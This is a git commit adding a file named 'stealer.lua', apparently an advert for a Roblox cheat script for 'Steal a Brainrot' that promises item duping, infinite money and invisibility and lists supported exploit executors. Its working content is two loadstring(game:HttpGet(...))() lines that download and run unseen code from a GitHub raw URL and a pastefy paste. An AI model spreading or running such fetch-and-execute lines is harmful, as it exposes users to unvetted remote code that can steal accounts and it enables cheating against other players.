2515d6e7f4a94a82fe555e7dff0b9e3cffc61606
SHADOW SCRIPTING <yourproaaliyan@gmail.com>
2025-10-24 16:39:10 +0500

    Create stealer.lua

---
+++ stealer.lua
@@ -0,0 +1,7 @@
+[🍔 STEAL A BRAINROT 🍕] DUPE/BRAINROT SPAWNER/INF MONEY/ANTI-HIT/INVISIBLE‼️
+[⚠️ !!!DONT USE FAKE SCRIPTS!!! ⚠️]
+Dev: Slfry
+SUPPORTS: Swift, Delta, Krnl, Awp, Wave, etc.
+Script: loadstring(game:HttpGet("https://raw.githubusercontent.com/MAROHUB/Sabscript/refs/heads/main/Solo"))()
+OR
+loadstring(game:HttpGet("https://pastefy.app/dEShcPV2/raw"))()
